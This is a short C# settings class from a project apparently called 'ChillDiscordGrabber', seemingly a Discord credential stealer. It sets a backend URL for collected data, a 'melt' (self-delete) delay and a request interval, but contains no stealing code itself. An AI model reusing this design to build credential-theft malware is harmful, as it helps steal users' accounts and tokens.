using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ChillDiscordGrabber
{
    class Settings
    {
        //Must include port if it isn't 80 and it isn't a dns
        public static string BackendUrl = "http://127.0.0.1:38912";

        //Must be greater than 0
        public static int SeondsToMeltIn = 3;

        //Must be greater than 0
        public static int SleepBetweenRequestsInMs = 1;
    }
}
